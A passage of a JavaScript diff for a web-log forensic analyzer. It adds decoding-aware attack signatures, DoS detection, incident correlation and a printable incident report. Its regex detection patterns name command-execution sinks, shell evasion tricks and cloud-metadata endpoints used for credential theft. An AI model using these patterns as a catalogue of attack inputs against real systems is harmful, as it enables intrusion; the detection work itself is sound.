+   =========================================================================== */
+
+function decodeCascade(s){
+  if (!s) return "";
+  const seen = [s]; let cur = s;
+  for (let i = 0; i < 3; i++){
+    let dec = cur;
+    try { dec = decodeURIComponent(cur.replace(/\+/g, " ")); } catch(e){}
+    dec = dec.replace(/%u([0-9a-fA-F]{4})/g, (m,h)=>String.fromCharCode(parseInt(h,16)))
+             .replace(/&#x([0-9a-fA-F]+);/g, (m,h)=>String.fromCharCode(parseInt(h,16)))
+             .replace(/&#(\d+);/g, (m,d)=>String.fromCharCode(+d));
+    if (dec === cur) break;
+    seen.push(dec); cur = dec;
+  }
+  const b64 = s.match(/[A-Za-z0-9+/]{16,}={0,2}/g);
+  if (b64) for (const c of b64.slice(0, 4)){
+    try { const d = atob(c); if (/[<'";(){}$=]/.test(d)) seen.push(d); } catch(e){}
+  }
+  return seen.join(" \u0001 ").toLowerCase();
+}
+
+/* extended signatures — evaluated against the decoded haystack, so they see
+   through the obfuscation that evades naive per-row matching. */
+const EXT_SIGS = [
+  { id:"xxe", sev:"critical", label:"XML external entity", why:"External-entity / DOCTYPE declaration submitted as input",
+    re:/<!entity|<!doctype[^>]*(system|public)|system\s+["'](file|http|php|expect):/i, mitre:{tactic:"Initial Access",id:"T1190",name:"Exploit Public-Facing Application (XXE)"} },
+  { id:"deserialize", sev:"critical", label:"Insecure deserialization", why:"Serialized Java/PHP/.NET object or gadget marker in the request",
+    re:/(ro0ab[a-z0-9]|aced0005|o:\d+:"[a-z0-9_\\]+":\d+:|objectdataprovider|__proto__|typeconfuse|readobject)/i, mitre:{tactic:"Execution",id:"T1059",name:"Command and Scripting Interpreter (deserialization)"} },
+  { id:"nosqli", sev:"high", label:"NoSQL injection", why:"Mongo/JSON operator injection in a parameter",
+    re:/(\[\$(ne|gt|lt|gte|lte|where|regex|exists|in|nin|or|and)\])|(\{\s*["']?\$(ne|gt|where|regex|expr))|(\$where\s*:)/i, mitre:{tactic:"Initial Access",id:"T1190",name:"Exploit Public-Facing Application (NoSQLi)"} },
+  { id:"ldapi", sev:"high", label:"LDAP injection", why:"LDAP filter meta-syntax in a parameter",
+    re:/(\)\(\|)|(\)\(&)|(\*\)\()|(\)\((uid|cn|mail|objectclass)=)/i, mitre:{tactic:"Initial Access",id:"T1190",name:"Exploit Public-Facing Application (LDAPi)"} },
+  { id:"proto_pollution", sev:"high", label:"Prototype pollution", why:"__proto__ / constructor.prototype manipulation",
+    re:/(__proto__|constructor\s*\[\s*["']?prototype|prototype\s*\[\s*["']?__proto__)/i, mitre:{tactic:"Execution",id:"T1059.007",name:"JavaScript"} },
+  { id:"graphql_abuse", sev:"medium", label:"GraphQL introspection / abuse", why:"Schema introspection or batched-query abuse",
+    re:/(__schema|introspectionquery|(__typename[\s\S]{0,40}){3,}|mutation\s*\{[\s\S]{0,20}\{[\s\S]{0,20}\{)/i, mitre:{tactic:"Discovery",id:"T1590",name:"Gather Victim Network Information"} },
+  { id:"secret_in_url", sev:"high", label:"Secret exposed in URL", why:"API key / token / password passed as a query parameter",
+    re:/[?&#][^=&]*(api[_-]?key|apikey|access[_-]?token|client[_-]?secret|auth[_-]?token|session[_-]?token|password|passwd|pwd)=[^&\s"']{6,}/i, mitre:{tactic:"Credential Access",id:"T1552.001",name:"Credentials In Files/URLs"} },
+  { id:"rce_advanced", sev:"critical", label:"Advanced command execution", why:"PHP/shell execution primitive or IFS/backtick evasion",
+    re:/((system|exec|passthru|popen|proc_open|shell_exec|assert|pcntl_exec)\s*\()|(\$\{ifs\})|(\$\(\s*\w)|(`[^`]{1,40}`)|(%0a\s*\/?bin)/i, mitre:{tactic:"Execution",id:"T1059",name:"Command and Scripting Interpreter"} },
+  { id:"xpath_injection", sev:"high", label:"XPath / XQuery injection", why:"XPath boolean or node-traversal injection",
+    re:/(count\s*\(\s*\/\/)|('\]\s*\|\s*\/\/)|(\bor\b\s+\d+=\d+\s+or\b)|(string-length\s*\()/i, mitre:{tactic:"Initial Access",id:"T1190",name:"Exploit Public-Facing Application (XPath)"} },
+  { id:"cloud_metadata", sev:"critical", label:"Cloud metadata / SSRF target", why:"Request steering at a cloud instance-metadata endpoint",
+    re:/(169\.254\.169\.254|metadata\.google\.internal|100\.100\.100\.200|metadata\.azure\.com|\/latest\/meta-data)/i, mitre:{tactic:"Credential Access",id:"T1552.005",name:"Cloud Instance Metadata API"} },
+  { id:"mass_assignment", sev:"medium", label:"Privilege-parameter tampering", why:"Privilege/role parameter set to an elevated value",
+    re:/[?&#](role|is_?admin|is_?superuser|privilege|account_?type|user_?type|access_?level)=(admin|superuser|root|true|1|elevated)/i, mitre:{tactic:"Privilege Escalation",id:"T1068",name:"Exploitation for Privilege Escalation"} },
+  { id:"csv_injection", sev:"low", label:"CSV / formula injection", why:"Spreadsheet formula prefix in a submitted field",
+    re:/[?&#][^=&]*=%?(3d|2b|40|2d)?\s*[=+@]\s*(cmd|sum|hyperlink|import|dde)/i, mitre:{tactic:"Execution",id:"T1204",name:"User Execution"} }
+];
+const EXT_SIG_BY_ID = {}; EXT_SIGS.forEach(s => EXT_SIG_BY_ID[s.id] = s);
+
+const AdvIntel = {
+  compute(){
+    const S = Store, n = S.n;
+    const out = { ext:[], dos:[], incidents:[], span:Analytics.spanMs||0, bucketMs:60000, peakRps:0, baseRps:0 };
+    if (!n) return out;
+
+    /* ---- 1. extended detection over UNIQUE urls (decode once each) -------- */
+    const urlArr = D.url.arr;
+    const urlExt = new Array(urlArr.length);        // urlId -> array of ext sig ids (or undefined)
+    for (let u = 0; u < urlArr.length; u++){
+      const raw = urlArr[u]; if (!raw || raw.length < 3) continue;
+      const hay = raw.toLowerCase() + " \u0001 " + decodeCascade(raw);
+      let hits = null;
+      for (const sig of EXT_SIGS){ if (sig.re.test(hay)){ (hits = hits || []).push(sig.id); } }
+      if (hits) urlExt[u] = hits;
+    }
+
+    /* ---- 2. single O(n) pass: buckets + ext tally + urlFreq -------------- */
+    const span = Math.max(1, Analytics.spanMs || 0), t0 = Analytics.minTs || 0;
+    let bucketMs = 60000;
+    if (span / bucketMs > 1500) bucketMs = Math.ceil(span / 1500 / 1000) * 1000;
+    out.bucketMs = bucketMs;
+    const nB = Math.max(1, Math.min(4000, Math.ceil(span / bucketMs) + 1));
+    const bReq = new Float64Array(nB), bErr = new Float64Array(nB), bByt = new Float64Array(nB);
+    const extTally = {};                            // id -> {events, srcSet, sample}
+    for (const s of EXT_SIGS) extTally[s.id] = { events:0, srcSet:new Set(), sample:-1 };
+
+    for (let r = 0; r < n; r++){
+      const ts = S.ts[r];
+      if (ts && t0){
+        const bi = Math.min(nB - 1, Math.floor((ts - t0) / bucketMs));
+        if (bi >= 0){ bReq[bi]++; if (S.status[r] >= 500) bErr[bi]++; bByt[bi] += S.bytes[r]; }
+      }
+      const ex = urlExt[S.url[r]];
+      if (ex){
+        const ipStr = D.ip.arr[S.ip[r]];
+        for (const id of ex){ const t = extTally[id]; t.events++; if (t.srcSet.size < 500 && ipStr) t.srcSet.add(ipStr); if (t.sample < 0) t.sample = r; }
+      }
+    }
+    out.ext = EXT_SIGS.filter(s => extTally[s.id].events > 0).map(s => ({
+      id:s.id, label:s.label, sev:s.sev, why:s.why, mitre:s.mitre,
+      events:extTally[s.id].events, sources:extTally[s.id].srcSet.size, sample:extTally[s.id].sample
+    })).sort((a,b)=> SEV_ORDER[a.sev]-SEV_ORDER[b.sev] || b.events-a.events);
+
+    /* ---- 3. DoS / DDoS detection from the request timeline --------------- */
+    // robust baseline: median + MAD of non-empty buckets
+    const nonEmpty = Array.from(bReq).filter(v => v > 0).sort((a,b)=>a-b);
+    if (nonEmpty.length >= 8){
+      const median = nonEmpty[nonEmpty.length >> 1];
+      const devs = nonEmpty.map(v => Math.abs(v - median)).sort((a,b)=>a-b);
+      const mad = devs[devs.length >> 1] || 1;
+      const thresh = Math.max(median + 6 * (mad || 1), median * 4, 30 * (bucketMs/1000)); // per-bucket
+      out.baseRps = +(median / (bucketMs/1000)).toFixed(1);
+      // find contiguous windows above threshold
+      const windows = [];
+      let s = -1;
+      for (let i = 0; i < nB; i++){
+        if (bReq[i] >= thresh){ if (s < 0) s = i; }
+        else if (s >= 0){ windows.push([s, i-1]); s = -1; }
+      }
+      if (s >= 0) windows.push([s, nB-1]);
+      out.peakRps = +(Math.max(0, ...Array.from(bReq)) / (bucketMs/1000)).toFixed(1);
+
+      if (windows.length){
+        // precise characterisation of each window in one extra pass
+        const winOf = new Int32Array(nB).fill(-1);
+        windows.forEach(([a,b2], wi) => { for (let i=a;i<=b2;i++) winOf[i] = wi; });
+        const acc = windows.map(() => ({ req:0, err:0, byt:0, uas:new Set(), srcs:new Set(), ep:new Map(), q:new Set() }));
+        for (let r = 0; r < n; r++){
+          const ts = S.ts[r]; if (!ts || !t0) continue;
+          const bi = Math.min(nB-1, Math.floor((ts - t0)/bucketMs));
+          const wi = bi>=0 ? winOf[bi] : -1; if (wi < 0) continue;
+          const w = acc[wi]; w.req++; if (S.status[r] >= 500) w.err++; w.byt += S.bytes[r];
+          if (w.uas.size < 4000) w.uas.add(S.ua[r]);
+          if (w.srcs.size < 4000) w.srcs.add(S.ip[r]);
+          const u = D.url.arr[S.url[r]] || ""; const path = u.split("?")[0];
+          w.ep.set(path, (w.ep.get(path)||0)+1);
+          if (w.q.size < 20000) w.q.add(u);
+        }
+        windows.forEach(([a,b2], wi) => {
+          const w = acc[wi];
+          const durMs = (b2 - a + 1) * bucketMs;
+          const rps = +(w.req / (durMs/1000)).toFixed(1);
+          const ratio = out.baseRps > 0 ? +(rps / out.baseRps).toFixed(1) : rps;
+          const errRatio = w.req ? w.err / w.req : 0;
+          const topEp = [...w.ep.entries()].sort((x,y)=>y[1]-x[1])[0] || ["—",0];
+          const uaDiv = w.uas.size, qRatio = w.req ? w.q.size / w.req : 0;
+          const avgBytes = w.req ? w.byt / w.req : 0;
+          let type, why;
+          if (errRatio > 0.3){ type = "Application-layer DoS (service degradation)"; why = Math.round(errRatio*100)+"% of requests in the window returned 5xx — the service is failing under load."; }
+          else if (uaDiv > 25 || uaDiv > w.req*0.4){ type = "Distributed L7 flood"; why = uaDiv+" distinct user-agents drove the spike — many clients behind the load balancer (botnet-like)."; }
+          else if (uaDiv <= 3){ type = "Single-source request flood"; why = "Traffic came from "+uaDiv+" client fingerprint(s) — a focused flood."; }
+          else { type = "Volumetric request spike"; why = "Sustained request volume far above the baseline."; }
+          const notes = [];
+          if (qRatio > 0.8 && w.req > 100) notes.push("cache-buster pattern ("+Math.round(qRatio*100)+"% unique URLs)");
+          if (avgBytes > 0 && out.span && (avgBytes > 5*1024*1024)) notes.push("large-response amplification ("+fmtBytes(avgBytes)+"/req avg)");
+          let sev = "medium";
+          if (ratio >= 10 || rps >= 500 || errRatio > 0.5) sev = "critical";
+          else if (ratio >= 5 || rps >= 150) sev = "high";
+          const conf = Math.max(30, Math.min(99, Math.round(40 + Math.min(40, ratio*3) + (errRatio>0.3?15:0) + (w.req>1000?10:0))));
+          out.dos.push({
+            type, why, notes, sev, confidence:conf,
+            from:t0 + a*bucketMs, to:t0 + (b2+1)*bucketMs, durationMs:durMs,
+            requests:w.req, rps, baseRps:out.baseRps, ratio, errRatio:+errRatio.toFixed(2),
+            topEndpoint:topEp[0], topEndpointHits:topEp[1], uaDiversity:uaDiv, sources:w.srcs.size
+          });
+        });
+        out.dos.sort((a,b)=> SEV_ORDER[a.sev]-SEV_ORDER[b.sev] || b.requests-a.requests);
+      }
+    }
+
+    /* ---- 4. correlation → incidents ------------------------------------- */
+    const sa = computeSessionActors();
+    out.sessionActors = sa;
+    const inc = [];
+    const fmtISO = ms => ms ? new Date(ms).toISOString().replace("T"," ").slice(0,19)+" UTC" : "—";
+
+    // (a) DoS incidents
+    out.dos.forEach((d, i) => {
+      inc.push({
+        id:"INC-D"+(i+1), kind:"Denial of Service", sev:d.sev, confidence:d.confidence,
+        title:d.type+" against "+(d.topEndpoint||"the service"),
+        from:d.from, to:d.to,
+        mitre:[d.errRatio>0.3?"T1499 Endpoint Denial of Service":"T1498 Network Denial of Service"],
+        narrative:"Between "+fmtISO(d.from)+" and "+fmtISO(d.to)+", request volume reached "+fmtInt(d.rps)+" req/s — "+d.ratio+"× the "+d.baseRps+" req/s baseline — concentrated on "+(d.topEndpoint||"multiple endpoints")+" ("+fmtInt(d.topEndpointHits)+" hits). "+d.why+(d.notes.length?" Also observed: "+d.notes.join("; ")+".":""),
+        evidence:[fmtInt(d.requests)+" requests in "+fmtDur(d.durationMs), d.uaDiversity+" client fingerprints", Math.round(d.errRatio*100)+"% 5xx"]
+      });
+    });
+
+    // (b) intrusion incidents from multi-phase / confirmed actors
+    const phaseOf = id => {
+      if (/scanner|automation/.test(id)) return "recon";
+      if (/sensitive_path|traversal|lfi/.test(id)) return "enumeration";
+      if (/sqli|xss|cmdi|rce|log4shell|ssti|webshell|xxe|deserialize|nosqli|ldapi|xpath|proto/.test(id)) return "exploitation";
+      return "activity";
+    };
+    sa.actors.slice(0, 12).forEach((a, i) => {
+      const strong = a.confidence >= 60 || a.worst === "critical" || a.categories.length >= 2;
+      if (!strong) return;
+      const phases = [];
+      a.categories.forEach(c => { const p = phaseOf(c.id); if (!phases.includes(p)) phases.push(p); });
+      const order = { recon:0, enumeration:1, exploitation:2, activity:3 };
+      phases.sort((x,y)=>order[x]-order[y]);
+      const worstCat = a.categories[0] ? a.categories[0].label : "attack";
+      inc.push({
+        id:"INC-A"+(i+1), kind:"Targeted intrusion", sev:a.worst, confidence:a.confidence,
+        title:(a.tool||"Unattributed actor")+" — "+worstCat+(a.categories.length>1?" +"+(a.categories.length-1)+" more":""),
+        from:a.first, to:a.last,
+        mitre:a.mitre.slice(0,4),
+        narrative:(a.tool?("Tooling "+a.tool):"An unattributed client")+" carried out "+fmtInt(a.events)+" malicious request(s) over "+fmtDur(a.durationMs)+", progressing through "+(phases.join(" → ")||"a single phase")+". Because the capture only exposes load-balancer IPs, this actor was reconstructed behaviourally (confidence "+a.confidence+"%). Categories: "+a.categories.map(c=>c.label+" ×"+c.n).join(", ")+".",
+        evidence:a.categories.map(c=>c.label+" ×"+c.n).slice(0,6).concat(a.ips.length?["via "+a.ips.join(", ")]:[])
+      });
+    });
+
+    inc.sort((x,y)=> SEV_ORDER[x.sev]-SEV_ORDER[y.sev] || y.confidence-x.confidence);
+    out.incidents = inc;
+    return out;
+  }
+};
+
+/* ===========================================================================
+   PROFESSIONAL INCIDENT REPORT  v2  (standalone, print → PDF)
+   =========================================================================== */
+function esc(s){ return String(s == null ? "" : s).replace(/[&<>"]/g, c => ({ "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;" }[c])); }
+
+function buildProReport(){
+  const A = Analytics, S = Store, now = new Date();
+  const span = A.spanMs || 0, totalEvents = S.n;
+  const fmtISO = ms => ms ? new Date(ms).toISOString().replace("T"," ").slice(0,19) + " UTC" : "—";
+  const sevBadge = sev => `<span class="badge ${sev}">${(sev||"low").toUpperCase()}</span>`;
+
+  let intel = { ext:[], dos:[], incidents:[], sessionActors:computeSessionActors() };
+  try { intel = AdvIntel.compute(); } catch(e){ intel.error = String(e && e.message || e); }
+  const sa = intel.sessionActors || computeSessionActors();
+
+  // worker-rule findings (content = row count, behavioural = source count)
+  const findings = [];
+  const sevTally = { critical:0, high:0, medium:0, low:0 };
+  for (let b = 0; b < 32; b++){
+    if (!A.ruleCount[b]) continue;
+    const rule = RULE_BY_BIT[b]; if (!rule) continue;
+    const sources = A.ruleSources[b] ? A.ruleSources[b].size : 0;
+    const metric = rule.behavioural ? sources : A.ruleCount[b];
+    sevTally[rule.sev] += metric;
+    findings.push({ id:rule.id, label:rule.label, sev:rule.sev, why:rule.why, behavioural:!!rule.behavioural,
+      count:A.ruleCount[b], metric, sources, sample:A.ruleSample[b], mitre:MITRE_MAP[rule.id]||null });
+  }
+  // merge extended (decoding-aware) findings
+  intel.ext.forEach(e => {
+    sevTally[e.sev] += e.events;
+    findings.push({ id:e.id, label:e.label, sev:e.sev, why:e.why, behavioural:false,
+      count:e.events, metric:e.events, sources:e.sources, sample:e.sample, mitre:e.mitre, ext:true });
+  });
+  findings.sort((x,y)=> SEV_ORDER[x.sev]-SEV_ORDER[y.sev] || y.metric-x.metric);
+
+  const critHigh = sevTally.critical + sevTally.high;
+  let level = "Low", lclass = "low";
+  if (intel.dos.some(d=>d.sev==="critical") || sevTally.critical >= 1){ level="Critical"; lclass="critical"; }
+  else if (sevTally.high >= 1 || intel.dos.length){ level="High"; lclass="high"; }
+  else if (sevTally.medium >= 1){ level="Medium"; lclass="medium"; }
+
+  const actors = A.actors || [];
+  // MITRE coverage (worker + ext)
+  const techMap = {};
+  findings.forEach(f => { if (f.mitre) (techMap[f.mitre.id] = techMap[f.mitre.id] || { ...f.mitre, count:0 }).count += f.metric; });
+  const techniques = Object.values(techMap).sort((a,b)=>b.count-a.count);
+
+  const parsedTotal = Files.list.reduce((s,f)=>s+(f.parsed||0),0);
+  const skipTotal = Files.list.reduce((s,f)=>s+(f.skipped||0),0);
+
+  // recommendations
+  const recDefs = { ...REMEDIATION,
+    xxe:"Disable external-entity resolution in every XML parser; prefer JSON; patch libraries.",
+    deserialize:"Never deserialize untrusted input; use allow-listed types or signed payloads; patch gadget libraries.",
+    nosqli:"Cast and validate parameter types server-side; reject query operators ($ne,$where…) in user input.",
+    ldapi:"Escape LDAP metacharacters; bind with parameterised filters; least-privilege the bind account.",
+    proto_pollution:"Freeze object prototypes; reject __proto__/constructor keys; upgrade vulnerable libraries.",
+    graphql_abuse:"Disable introspection in production; enforce query depth/complexity limits and cost analysis.",
+    secret_in_url:"Move secrets to headers/body over TLS; rotate any key seen in a URL; purge them from logs.",
+    rce_advanced:"Eliminate dynamic execution sinks; strict input allow-listing; a 2xx here is a suspected RCE — isolate the host.",
+    xpath_injection:"Parameterise XPath/XQuery; validate input against a schema.",
+    cloud_metadata:"Block egress to 169.254.169.254 and internal ranges; enforce IMDSv2; segment the app tier.",
+    mass_assignment:"Bind only explicitly-allowed fields server-side; never trust client-supplied role/privilege parameters.",
+    csv_injection:"Prefix risky cells on export; sanitise leading =,+,-,@ in user-supplied fields." };
+  const recs = []; const seen = new Set();
+  findings.filter(f => f.sev==="critical"||f.sev==="high").forEach(f => {
+    if (recDefs[f.id] && !seen.has(f.label)){ seen.add(f.label); recs.push({ sev:f.sev, label:f.label, text:recDefs[f.id] }); }
+  });
+
+  // representative content-signature timeline
+  const timeline = findings.filter(f => !f.behavioural && (f.sev==="critical"||f.sev==="high") && f.sample >= 0)
+    .map(f => { const r = f.sample; return { ts:S.ts[r], sev:f.sev, label:f.label, ip:D.ip.arr[S.ip[r]]||"-", url:D.url.arr[S.url[r]]||"-", status:S.status[r] }; })
+    .sort((a,b)=>(a.ts||0)-(b.ts||0));
+
+  /* ---- executive narrative ---- */
+  const execParas = [];
+  const topCat = findings[0] ? findings[0].label : "no attack";
+  execParas.push(`Analysis of ${fmtInt(totalEvents)} log events across ${Files.list.length} file(s) spanning ${fmtDur(span)} (${fmtISO(A.minTs)} → ${fmtISO(A.maxTs)}) assessed the overall posture as <strong>${level}</strong>. ${fmtInt(critHigh)} critical/high events matched ${findings.length} distinct detection categories, led by <strong>${esc(topCat)}</strong>. The correlation engine grouped activity into <strong>${intel.incidents.length} incident(s)</strong>${intel.dos.length?`, including ${intel.dos.length} denial-of-service event(s)`:""}.`);
+  if (sa.proxyBlind) execParas.push(`The capture exposes <strong>no external client IP</strong> — all traffic is attributed to ${sa.distinctIpCount} internal load-balancer address(es), so IP attribution is impossible. ${sa.total} distinct attacker session(s) were reconstructed behaviourally; restoring real IPs requires logging <span class="mono">X-Forwarded-For</span> at the balancer.`);
+  else if (sa.collapsed) execParas.push(`Only ${sa.publicIpCount} source IP(s) are visible behind the proxy; ${sa.total} attacker session(s) were reconstructed behaviourally to compensate.`);
+
+  /* ---- styles ---- */
+  const css = `
+    :root{--ink:#14181f;--mut:#5b6572;--line:#e2e6ec;--bg:#fff;--accent:#1f6feb;
+      --critical:#c62828;--high:#e8730c;--medium:#b58900;--low:#2f7d34;--panel:#f7f9fc;}
+    *{box-sizing:border-box}body{font:14px/1.55 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;color:var(--ink);margin:0;background:#eceef2}
+    .page{max-width:920px;margin:24px auto;background:#fff;padding:56px 60px;box-shadow:0 1px 4px rgba(0,0,0,.12)}
+    h1{font-size:26px;margin:0 0 4px}h2{font-size:18px;margin:34px 0 12px;padding-bottom:6px;border-bottom:2px solid var(--ink)}
+    h3{font-size:13px;margin:16px 0 6px;text-transform:uppercase;letter-spacing:.04em;color:var(--mut)}
+    p{margin:8px 0}.mono{font-family:"SF Mono",Menlo,Consolas,monospace;font-size:12px;word-break:break-all}
+    .cover{border-bottom:3px solid var(--ink);padding-bottom:20px;margin-bottom:8px}
+    .classif{display:inline-block;background:var(--ink);color:#fff;font-size:11px;font-weight:700;letter-spacing:.12em;padding:3px 10px;border-radius:3px}
+    .sub{color:var(--mut);font-size:13px}
+    .lvl{display:inline-block;padding:6px 16px;border-radius:6px;color:#fff;font-weight:700;font-size:15px}
+    .lvl.critical{background:var(--critical)}.lvl.high{background:var(--high)}.lvl.medium{background:var(--medium)}.lvl.low{background:var(--low)}
+    .kpis{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin:18px 0}
+    .kpi{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:12px 14px}
+    .kpi .v{font-size:22px;font-weight:700}.kpi .l{font-size:11px;color:var(--mut);text-transform:uppercase;letter-spacing:.04em;margin-top:2px}
+    table{width:100%;border-collapse:collapse;margin:10px 0;font-size:13px}
+    th{text-align:left;background:var(--panel);border-bottom:2px solid var(--line);padding:8px 10px;font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--mut)}
+    td{border-bottom:1px solid var(--line);padding:8px 10px;vertical-align:top}
+    .badge{display:inline-block;color:#fff;font-size:10px;font-weight:700;padding:2px 7px;border-radius:3px}
+    .badge.critical{background:var(--critical)}.badge.high{background:var(--high)}.badge.medium{background:var(--medium)}.badge.low{background:var(--low)}
+    .finding{border:1px solid var(--line);border-left-width:4px;border-radius:6px;padding:10px 14px;margin:8px 0}
+    .finding.critical{border-left-color:var(--critical)}.finding.high{border-left-color:var(--high)}.finding.medium{border-left-color:var(--medium)}.finding.low{border-left-color:var(--low)}
+    .finding .t{font-weight:700}.finding .d{color:var(--mut);font-size:13px;margin-top:3px}
+    .inc{border:1px solid var(--line);border-top-width:4px;border-radius:8px;padding:14px 16px;margin:12px 0;background:#fff}
+    .inc.critical{border-top-color:var(--critical)}.inc.high{border-top-color:var(--high)}.inc.medium{border-top-color:var(--medium)}.inc.low{border-top-color:var(--low)}
+    .inc .h{display:flex;justify-content:space-between;align-items:baseline;gap:10px;flex-wrap:wrap}
+    .inc .id{font-weight:700;font-size:15px}.inc .kind{font-size:11px;text-transform:uppercase;letter-spacing:.05em;color:var(--mut)}
+    .inc .narr{margin:8px 0;font-size:13.5px}.chip{display:inline-block;background:#eaeef5;border:1px solid var(--line);border-radius:20px;padding:1px 9px;font-size:11px;margin:2px 4px 2px 0}
+    .note{background:#fff8e6;border:1px solid #f0d98c;border-radius:8px;padding:12px 16px;margin:14px 0}
+    .actor{border:1px solid var(--line);border-radius:8px;padding:12px 16px;margin:10px 0;background:var(--panel)}
+    .actor .h{display:flex;justify-content:space-between;align-items:baseline;gap:10px}.actor .id{font-weight:700}
+    .muted{color:var(--mut)}.small{font-size:12px}
+    ul.rec{margin:8px 0;padding-left:0;list-style:none}ul.rec li{border-left:3px solid var(--line);padding:6px 12px;margin:6px 0;background:var(--panel)}
+    .foot{margin-top:40px;padding-top:14px;border-top:1px solid var(--line);color:var(--mut);font-size:11px}
+    @media print{body{background:#fff}.page{box-shadow:none;margin:0;max-width:none;padding:24px 30px}h2{page-break-after:avoid}.finding,.actor,.inc,tr{page-break-inside:avoid}}
+  `;
+
+  let sec = 0; const H = t => `<h2>${++sec} · ${t}</h2>`;
+  let h = "";
+  h += `<div class="cover"><span class="classif">CONFIDENTIAL — INCIDENT REPORT</span>`;
+  h += `<h1>VEHCS Web-Traffic Threat Assessment</h1>`;
+  h += `<div class="sub">Generated ${esc(fmtISO(now.getTime()))} &nbsp;·&nbsp; Capture ${esc(fmtISO(A.minTs))} → ${esc(fmtISO(A.maxTs))} &nbsp;·&nbsp; VEHCS Log Analyzer — Forensic Console</div></div>`;
+
+  h += H("Executive Summary");
+  h += `<p>Overall threat posture: <span class="lvl ${lclass}">${level.toUpperCase()}</span></p>`;
+  h += `<div class="kpis">`;
+  h += `<div class="kpi"><div class="v">${fmtInt(totalEvents)}</div><div class="l">Events analysed</div></div>`;
+  h += `<div class="kpi"><div class="v">${fmtInt(critHigh)}</div><div class="l">Critical + high</div></div>`;
+  h += `<div class="kpi"><div class="v">${fmtInt(intel.incidents.length)}</div><div class="l">Correlated incidents</div></div>`;
+  h += `<div class="kpi"><div class="v">${fmtInt(intel.dos.length)}</div><div class="l">DoS / DDoS events</div></div>`;
+  h += `</div>`;
+  execParas.forEach(p => h += `<p>${p}</p>`);
+  if (sa.proxyBlind || sa.collapsed) h += `<div class="note"><strong>Attribution constraint.</strong> ${sa.proxyBlind?`No external client IP is present — only ${sa.distinctIpCount} internal load-balancer address(es).`:`Only ${sa.publicIpCount} source IP(s) are visible behind the proxy.`} Detection and correlation therefore run on request content, behaviour and timing (no IP required); distinct attackers appear as <em>session actors</em>. Configure the balancer to log <span class="mono">X-Forwarded-For</span> to restore true source IPs.</div>`;
+
+  // Correlated incidents — the headline reasoning output
+  h += H("Correlated Incidents");
+  if (!intel.incidents.length) h += `<p class="muted">No incidents correlated above threshold.</p>`;
+  intel.incidents.slice(0, 12).forEach(I => {
+    h += `<div class="inc ${I.sev}"><div class="h"><span><span class="id">${esc(I.id)}</span> &nbsp;${esc(I.title)}</span><span>${sevBadge(I.sev)} &nbsp;<span class="small muted">${esc(I.kind)} · confidence ${I.confidence}%</span></span></div>`;
+    h += `<div class="small muted">${esc(fmtISO(I.from))} → ${esc(fmtISO(I.to))}</div>`;
+    h += `<div class="narr">${esc(I.narrative)}</div>`;
+    if (I.evidence && I.evidence.length) h += `<div>${I.evidence.map(e=>`<span class="chip">${esc(e)}</span>`).join("")}</div>`;
+    if (I.mitre && I.mitre.length) h += `<div class="small muted" style="margin-top:6px">MITRE: ${esc(I.mitre.join("; "))}</div>`;
+    h += `</div>`;
+  });
+
+  // DoS / DDoS
+  h += H("Denial-of-Service Analysis");
+  if (!intel.dos.length) h += `<p class="muted">No volumetric or application-layer DoS pattern detected. Baseline ≈ ${intel.baseRps||0} req/s${intel.peakRps?`, peak ${intel.peakRps} req/s`:""}.</p>`;
+  else { h += `<p class="small muted">Baseline ≈ ${intel.baseRps} req/s; peak ${intel.peakRps} req/s. Windows where request volume exceeded the statistical baseline:</p>`;
+    h += `<table><tr><th>Window (UTC)</th><th>Type</th><th>Peak</th><th>×base</th><th>5xx</th><th>Top target</th><th>Conf.</th></tr>`;
+    intel.dos.forEach(d => h += `<tr><td class="small mono">${esc(fmtISO(d.from))}<br>${esc(fmtISO(d.to))}</td><td>${sevBadge(d.sev)} ${esc(d.type)}${d.notes.length?`<div class="small muted">${esc(d.notes.join("; "))}</div>`:""}</td><td>${fmtInt(d.rps)}/s</td><td>${d.ratio}×</td><td>${Math.round(d.errRatio*100)}%</td><td class="small mono">${esc((d.topEndpoint||"—").slice(0,40))}<div class="small muted">${fmtInt(d.topEndpointHits)} hits</div></td><td>${d.confidence}%</td></tr>`);
+    h += `</table>`; }
+
+  h += H("Key Findings");
+  if (!findings.length) h += `<p class="muted">No attack signatures fired.</p>`;
+  findings.slice(0, 16).forEach(f => {
+    const mt = f.mitre ? ` · MITRE ${f.mitre.id} ${esc(f.mitre.name)}` : "";
+    const metricStr = f.behavioural ? `${fmtInt(f.sources)} source(s)` : `${fmtInt(f.count)} event(s) from ${fmtInt(f.sources)} source(s)`;
+    h += `<div class="finding ${f.sev}"><div class="t">${sevBadge(f.sev)} &nbsp;${esc(f.label)} — ${metricStr}${f.ext?` <span class="chip">decoding-aware</span>`:""}</div><div class="d">${esc(f.why||"")}${mt}.</div></div>`;
+  });
+
+  h += H("Reconstructed Attackers (IP-independent)");
+  if (!sa.actors.length) h += `<p class="muted">No attacker sessions reconstructed.</p>`;
+  else { h += `<p class="small muted">Distinct actors recovered from behavioural fingerprints — valid even though all traffic shares ${sa.distinctIpCount} infrastructure IP(s).</p>`;
+    sa.actors.slice(0, 8).forEach(a => {
+      const cats = a.categories.slice(0,5).map(c=>`<span class="chip">${esc(c.label)} ×${c.n}</span>`).join("");
+      h += `<div class="actor"><div class="h"><span class="id">${a.id} · ${esc(a.tool||"unknown client")}</span><span>${sevBadge(a.worst)} &nbsp;confidence ${a.confidence}%</span></div><div class="small muted mono">${esc((a.ua||"-").slice(0,110))}</div><div style="margin-top:6px">${cats}</div><div class="small muted" style="margin-top:6px">${fmtInt(a.events)} attacks · ${a.reqPerMin} req/min · ${fmtDur(a.durationMs)} active · via ${esc(a.ips.join(", ")||"—")}</div></div>`;
+    }); }
+
+  if (actors.length){
+    h += H("Threat Sources (by IP)");
+    h += `<table><tr><th>Source</th><th>Risk</th><th>Requests</th><th>Behaviours</th><th>Signatures</th></tr>`;
+    actors.slice(0,15).forEach(s => {
+      const ipStr = D.ip.arr[s.ip] != null ? D.ip.arr[s.ip] : s.ip;
+      const beh = (s.reasons||[]).map(r=>esc((RULE_BY_ID[r.id]||{}).label||r.id)).join(", ");
+      const sig = (s.sigHits||[]).map(r=>esc(r.label)).slice(0,4).join(", ");
